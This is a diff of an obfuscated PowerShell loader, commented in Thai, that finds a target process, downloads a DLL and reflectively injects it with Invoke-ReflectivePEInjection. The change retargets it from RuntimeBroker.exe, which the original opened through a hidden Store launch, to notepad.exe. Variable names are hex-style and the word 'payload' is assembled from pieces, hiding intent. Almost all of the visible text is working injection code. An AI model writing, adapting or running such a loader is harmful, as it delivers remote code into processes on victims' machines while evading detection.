@@ -10,30 +10,29 @@ $_0x91A = @(
 "payload"
 ) -join ""
 
-Write-Host "[*] Searching for RuntimeBroker.exe..." -ForegroundColor Cyan
+Write-Host "[*] Searching for notepad.exe..." -ForegroundColor Cyan
 
-# หา RuntimeBroker process
-$runtimeProc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
+# หา notepad process
+$targetProc = Get-Process -Name "notepad" -ErrorAction SilentlyContinue | Select-Object -First 1
 
-if ($null -eq $runtimeProc) {
-    Write-Host "[!] RuntimeBroker not found, starting new instance..." -ForegroundColor Yellow
+if ($null -eq $targetProc) {
+    Write-Host "[!] Notepad not found, starting new instance..." -ForegroundColor Yellow
     
-    # เปิด RuntimeBroker ใหม่ (Windows จะเปิดอัตโนมัติ)
-    # วิธี 1: เปิดผ่าน Windows Store app
-    Start-Process "ms-windows-store:" -WindowStyle Hidden -ErrorAction SilentlyContinue
+    # เปิด notepad ใหม่
+    Start-Process "notepad.exe" -WindowStyle Normal
     Start-Sleep -Seconds 2
     
     # ลองหาอีกครั้ง
-    $runtimeProc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
+    $targetProc = Get-Process -Name "notepad" -ErrorAction SilentlyContinue | Select-Object -First 1
     
-    if ($null -eq $runtimeProc) {
-        Write-Host "[ERROR] Failed to start RuntimeBroker" -ForegroundColor Red
+    if ($null -eq $targetProc) {
+        Write-Host "[ERROR] Failed to start notepad" -ForegroundColor Red
         exit 1
     }
 }
 
-$targetPID = $runtimeProc.Id
-Write-Host "[+] Found RuntimeBroker PID: $targetPID" -ForegroundColor Green
+$targetPID = $targetProc.Id
+Write-Host "[+] Found notepad PID: $targetPID" -ForegroundColor Green
 
 # ดาวน์โหลด DLL
 Write-Host "[*] Downloading DLL..." -ForegroundColor Cyan
@@ -67,7 +66,7 @@ $_0xA77 | Set-Content $_0xC11 -Encoding UTF8
 # โหลด injection script
 . $_0xC11
 
-# Inject เข้า RuntimeBroker
+# Inject เข้า notepad
 Write-Host "[*] Injecting into PID $targetPID..." -ForegroundColor Cyan
 try {
     Invoke-ReflectivePEInjection -PEBytes $_0x5F9 -ProcId $targetPID
